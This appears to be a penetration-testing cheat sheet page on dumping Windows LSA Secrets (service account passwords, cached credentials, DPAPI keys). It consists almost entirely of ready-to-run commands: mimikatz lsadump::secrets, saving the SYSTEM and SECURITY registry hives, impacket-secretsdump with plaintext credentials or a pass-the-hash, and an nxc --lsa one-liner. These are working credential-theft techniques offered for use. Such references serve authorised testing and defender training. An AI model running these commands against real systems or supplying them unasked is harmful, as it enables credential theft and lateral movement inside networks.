---
icon: satellite
---

# LSA Secrets Dumping

LSA Secrets store service account passwords, cached credentials, DPAPI keys, auto-logon passwords, VPN credentials. Stored in registry: `HKLM\\SECURITY\\Policy\\Secrets`

**Requirement:** SYSTEM

***

### mimikatz from memory (Windows)

```powershell
.\\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```

***

### Registry hive + mimikatz offline (Windows)

```bash
# Dump hives
reg save HKLM\\SYSTEM C:\\temp\\system
reg save HKLM\\SECURITY C:\\temp\\security
```

```powershell
# Parse with mimikatz
.\\mimikatz.exe "lsadump::secrets /system:C:\\temp\\system /security:C:\\temp\\security" "exit"
```

***

### &#x20;impacket secretsdump (Linux)

```bash
# Remote — with creds
impacket-secretsdump corp.local/john:Password123@192.168.1.20

# Remote — with hash
impacket-secretsdump -hashes :NTLMHASH corp.local/john@192.168.1.20

# Offline — from hive files
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

***

### nxc (Linux)

```bash
nxc smb 192.168.1.20 -u john -p Password123 --lsa
```

***
